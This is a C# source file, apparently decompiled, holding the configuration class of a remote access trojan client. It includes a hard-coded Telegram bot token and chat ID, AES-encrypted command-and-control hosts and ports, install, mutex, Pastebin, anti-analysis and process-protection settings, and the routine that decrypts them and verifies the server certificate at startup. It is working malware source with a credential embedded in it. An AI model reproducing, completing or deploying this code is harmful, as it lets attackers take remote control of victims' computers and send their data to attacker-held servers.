using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string TelegramToken = "2138002346:AAFEGme77cRd0EtXwtIdAJ57I-iXSaOMcnc";

	public static string TelegramChatID = "645987648";

	public static string Ports = "A1fZvDKKVGNFKDKn0N5fUawtGXwZGP+huKZGUXsARPZ39tN41ChuBugWMrrHhbU2Rr2mZDAZ1ts8zcUHJci2zQ==";

	public static string Hosts = "A4yZBQTAMJHbbRckHByf7ijy7/C235SMGo9BVhDtMENhAj4pVDJhSzLLQVVgocXO1NDZgeBUXh0c+CdNI8P9hA==";

	public static string Version = "cWBMoxQZxhZElhCd+gUSK1nPjqSjFEjx8QYqsUkOaNCz3Sn/a8X7kIddgKGF8MUCrZIm+cszLdCBYm+RbKn+uQ==";

	public static string Install = "+o7b5GMmGEhiOdOPdXVxZ0A2TdQNJpO3lA/PUWSDDZWKSZiuZCSZgiEvFkSOc7N9EOEGegkMqIT3Es1yXjVNaA==";

	public static string InstallFolder = "%AppData%";

	public static string InstallFile = "";

	public static string Key = "bXZRVHRTY1hxMmZLTTRiczFldmVsYVJUSlhSQjZ0Mkk=";

	public static string MTX = "LERXmj4EqvVSQN18GuWGqAyZp0gr1j25ug5nByvNwTuUol2t8XlPXUUEDyK/hsFY4WiPgAZAHkGvTXyHHJHlElBw/DA4t6qyK1ZTj9a0c6w=";

	public static string Certificate = "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";

	public static string Serversignature = "2A4CKGJdrEkf1SaoQqYwra14BGLta0MJUCL/QCDIMaBWw6EnMeLkzJhMWPQ20QBYm3Zmc0pQoD2ku4NG/JNwENG4VMfBxlA+GRriNRVU054NIqHpw0p7Ojv0muexfdhSs9ldvKH0o/084a6HoOo02lyQi8I+XAdBQRhW00MIBApE86mOPnlGHCXt1HatsJsQlxGpwd7OuWRGFHjDCUQaRFndGdf/TYwfFSDQ7DFMlfF90r6wuEBGIP/KNLkHn2cPg3oyTGX/tE/36/ed0zJqGwrQ+mwDgFlXJKfHkqirfUmNX84GONWCOMhScaN+IZj/fzxnUzc7JGG+mznyj5WuszZBPtsjsFBLnYU2nB1B8EnVrGWvHtGYPdx8DPEcZS1hzO71ceoBkoDPIQsVcW/wQwJYhxDj00G3tHlkV360NUzVNUJy6TIl8Z8fdWIvgBGMBOFtFLmN8xY7ehsG6QPj+cyj4xNz3HrEIs77TkbsiBQk+AUceFRg9Kqbvw52IpienY/TJTTgR/2HHIkyXkLtsEAR5EOFLH59pp6rFrBiz6rj2DPfAspA56AX71ToGLl13/tsHRYG4TNNvWafM8/d93yzOGjkDyHXWUZwT9eP9/KpS8++t5FoTiiT2UH7Fl4XngvoP6TG2tm62lY4CG2p7bVNOum0pBwC98GlL36WrSzEpym4fWwOM+iBjmPFS48Lo7p58HLspBI+0ayIbLOWo1a+1hmowQy5Adv+qQGnHvbXKzSLu5oV+cIlaZivHqznMDTrbL55/+mmq2M/rpv21inaROKyzOlrvSRlGncgd3CYZXlk75asAcGLW1x6IfDf5GbVWo4hQ/hjhSeGSi3LcRlSnB9+fKLu9e1mdcA4xa2TYVor6TwGcOzGEv0XR0DJ5DrC4dL41fRn1NkB08Iq0MTseAIOPtLBU/CMvx9dDJ252RYMY9M8hqrCNxIUKsMe8Tw1j5KxuyvVSuxkaUitGg==";

	public static X509Certificate2 ServerCertificate;

	public static string Anti = "15WZSktoeZP6q2R+9G10CCYuN3ziVArMJ5FrCRQQUmB5kt7IhtoEKU1L6DH5KTKseqh/GwyEyFjtIlIBwjEJgg==";

	public static Aes256 aes256;

	public static string Pastebin = "95WBQrIoE1nISCawc0Z6yKGWIl40T1PKGWJ4rDH4DkaefxlvEF+03UkE6qNJcLexav1ILf7Ec65DeCcTLn6v3Q==";

	public static string BDOS = "5Z1IESt/GXpiVXK1wogYuANrTQpw4LPxcwed9q8KC42boDGsp+Tru8AxSLnpu0aHTZK2Af28vi1TiZRFozOJKQ==";

	public static string Hwid = null;

	public static string Delay = "3";

	public static string Group = "YR3Qejpr04craYwp71UUECBdZ6CgsHduYfo4vwpel/lNLS4zZLjCbZ5PjtL0uk6QFFAr9PFpvTuaa2krb1+OfA==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			TelegramToken = TelegramToken;
			TelegramChatID = TelegramChatID;
			Ports = aes256.Decrypt(Ports);
			Hosts = aes256.Decrypt(Hosts);
			Version = aes256.Decrypt(Version);
			Install = aes256.Decrypt(Install);
			MTX = aes256.Decrypt(MTX);
			Pastebin = aes256.Decrypt(Pastebin);
			Anti = aes256.Decrypt(Anti);
			BDOS = aes256.Decrypt(BDOS);
			Group = aes256.Decrypt(Group);
			Hwid = HwidGen.HWID();
			Serversignature = aes256.Decrypt(Serversignature);
			ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			return ((RSACryptoServiceProvider)ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
